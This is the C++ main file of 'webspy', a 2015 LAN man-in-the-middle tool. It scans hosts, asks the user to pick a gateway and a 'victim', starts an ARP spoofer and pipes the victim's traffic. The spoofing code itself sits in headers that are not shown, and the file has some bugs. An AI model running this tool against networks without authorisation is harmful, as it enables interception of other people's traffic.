/*
 * main.cpp
 *
 *  Created on: Apr 6, 2015
 *      Author: Felipe Rodopoulos
 */

// std-cpp
#include <string>
#include <vector>

//std-c
#include <stdio.h>
#include <libnet.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <stdlib.h>
#include <unistd.h>
#include <linux/if_link.h>

//wepspy
#include "Globals.h"
#include "Sweeper.h"
#include "Host.h"
#include "Pipe.h"
#include "Spoofer.h"

using namespace std;

static void showUsage(int exitCode){
	fprintf(stderr, "Usage: webspy [-v] [-l] [-i iface]\n");
	fprintf(stderr, "Options:\n");
	fprintf(stderr, "    -h,--help          Show this help message\n");
	fprintf(stderr, "    -v,--verbose       Enable verbose mode\n");
	fprintf(stderr, "    -l,--logging       Enable logging (avaiable at ./log)\n");
	fprintf(stderr, "    -i,--interface     Select the network interface\n\n");
	fprintf(stderr, "Developed by Felipe Rodopoulos, 2015\n\n");
	exit(exitCode);
}

static void parseProgramArguments(int argc, char* argv[]){
	for(int i = 1; i < argc; i++){
		std::string arg = argv[i];
		if(arg == "-h" || arg == "--help"){
			showUsage(EXIT_SUCCESS);
		} else if(arg == "-l" || arg == "--logging"){
			Globals::logging = true;
		} else if(arg == "-v" || arg == "--verbose"){
			Globals::verbose = true;
		} else if(arg == "-i" || arg == "--iface"){
			Globals::iface = argv[i + 1];
			i++;
		} else{
			printf("Unrecognized argument: %s\n", argv[i]);
			showUsage(EXIT_FAILURE);
		}
	}
}

static void showAvaiableInterfaces(std::vector<char*>& ifaceNames){
	struct ifaddrs *ifaces, *it;

	if(getifaddrs(&ifaces)){
		fprintf(stderr, "webspy: [ERRO] Socket Error: could't retrieve interfaces. Try specifying one with -i directive.\n");
		exit(EXIT_FAILURE);
	}
	if(!ifaces){
		fprintf(stderr, "webspy: [ERRO] Socket Error: no interfaces avaiable.\n");
		exit(EXIT_FAILURE);
	}

	printf("Avaiable interfaces:\n");
	it = ifaces;
	int family, i=1;
	while(it != NULL){
		if(it->ifa_addr == NULL){
			continue;
		}

		family = it->ifa_addr->sa_family;
		if(family == AF_INET){
			printf("\t%d - %s\n", i, it->ifa_name);
			ifaceNames.push_back(it->ifa_name);
			i++;
		}
		it = it->ifa_next;
	}
}

static void selectInterface(){

	printf("No interface selected...\n");
	vector<char*> ifacesNames;
	showAvaiableInterfaces(ifacesNames);

	unsigned opt;
	printf("\nOption [id only]: ");
	scanf("%d", &opt);
	getchar();
	// TODO teste de leitura do scanf

	Globals::iface = ifacesNames[opt - 1];
}

static Host& selectVictim(vector<Host> hosts){
	vector<Host>::iterator it;
	int i = 1;
	printf("\nID     IP                  MAC\n");
	for(it = hosts.begin(); it != hosts.end(); it++){
		printf("%-3d    %-15s     %-17s\n", i, Host::ipToString(it->ip).c_str(), Host::macToString(it->mac).c_str());
		i++;
	}
	int op;
	printf("\nSelect victim [ID]: ");
	scanf("%d", &op);
	// TODO teste de leitura do scanf
	return hosts[op - 1];
}

int main(int argc, char* argv[]){
	parseProgramArguments(argc, argv);

	if(Globals::iface == NULL){
		selectInterface();
	}

	if(Globals::verbose)
		printf("Inteface selected: %s\n", Globals::iface);

	Globals::findAttacker();
	Globals::findGateway();

	if(Globals::verbose){
		printf("Your machine -> ");
		Globals::attacker.toString();
	}

	Sweeper sweeper;
	vector<Host>& avaiableHosts = sweeper.sweep();
	if(avaiableHosts.size() == 0){
		printf("No hosts on the net besides you. Exiting...\n");
		exit(EXIT_SUCCESS);
	}

	if(!Globals::gateway.ip){
		printf("Gateway could not be found, select one below:\n\n");
		Globals::gateway = selectVictim(avaiableHosts);
		Globals::gateway.setName("Gateway");
	}
	if(!Globals::gateway.mac){
		Sweeper::getGatewayMAC();
	}

	Globals::victim = selectVictim(avaiableHosts);
	Globals::victim.setName("Victim");

	Spoofer spoofer;
	spoofer.init();

	Pipe gateway2victim(Globals::gateway, Globals::victim);
	/*
	Pipe victim2gateway(victim, gateway);

	while(true){
		Renderer renderer();
	}
	*/

	return 0;
}
